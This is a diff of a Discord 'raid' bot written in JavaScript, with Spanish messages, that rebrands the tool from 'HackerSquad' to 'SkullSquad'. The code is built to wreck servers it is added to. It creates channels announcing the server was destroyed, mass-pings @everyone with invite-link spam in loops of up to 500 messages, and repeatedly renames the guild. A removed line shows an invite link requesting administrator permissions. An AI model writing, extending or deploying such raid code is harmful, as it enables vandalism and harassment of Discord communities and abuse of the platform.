@@ -7,7 +7,7 @@ client.on("ready", () => {
   console.log(chalk.green("Iniciando bot raid."));
   console.log(chalk.green("Iniciando bot raid.."));
   console.log(chalk.green("Iniciando bot raid..."));
-  console.log(chalk.green("¿Quieres el bot?: https://discord.com/api/oauth2/authorize?client_id=821537262701510696&permissions=8&scope=bot "));
+  console.log(chalk.green("#SkullSquad "));
  
  
 console.log(chalk.greenBright(`   
@@ -54,7 +54,7 @@ console.log(chalk.greenBright(`
 console.log("                          ");  
 console.log("   ")
   console.log(chalk.green(`[Cliente ${client.user.tag} listo para el raid!]`));  
-  console.log(chalk.greenBright("[Bot creado por infecting#0001]"));   
+  console.log(chalk.greenBright("[Bot creado por infecting#0006]"));   
   console.log("      ") 
   console.log("      ")
   console.log("      ")
@@ -79,7 +79,7 @@ function presencia(){
   client.user.setPresence({
 status: "online",
 activity: {
-  name: "#HkerShit - https://discord.gg/vCHNhVjafJ ",
+  name: "#SkullSquad  -  https://discord.gg/skulls",
   type: "PLAYING"
  
 }
@@ -97,7 +97,7 @@ client.on("message", message => {
     message.guild.channels.create(`hker-shit`, {
       type: 'text'
     }).then(channel => {
-      channel.send("@everyone - ESTE SERVER FUE DESTRUIDO POR @infecting#0001")
+      channel.send("@everyone - ESTE SERVER FUE DESTRUIDO POR SKULLSQUAD  -  https://discord.gg/skulls")
  
     })
   }
@@ -115,23 +115,23 @@ client.on("message", message => {
       message.guild.channels.create(`raided-by-hker-shit`, {
         type: 'text'
       }).then(channel => {
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
-        channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullrSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
+        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
         
  
       })
@@ -147,7 +147,7 @@ if(message.content === '!raid') {
   message.delete()
   console.log("[$]", console.log("SPAM SUCCESFULLY"));
   for(let i = 0; i <= 500; i++) {
-  message.channel.send("@everyone **HackerSquad Is Here** - https://discord.gg/vCHNhVjafJ")
+  message.channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/Skulls")
 }
 }
 })
@@ -187,8 +187,8 @@ client.on("message", message => {
     message.delete()
     console.log("[$]", console.log("NICK LAG SUCCESFULLY"));
     for(let i = 0; i <= 500; i++) {
-      message.guild.setName("RaidedByHackerSquad");
-      message.guild.setName("RaidedByHker$h11t");
+      message.guild.setName("RaidedBySkullSquad");
+      message.guild.setName("RaidedBySkullSquad");
     }
   }
 })
@@ -227,4 +227,4 @@ client.on("message", message => {
  
  
  
-client.login("TOKEN AQUI PE CAUSAAAAAA");
+client.login("TOKEN");
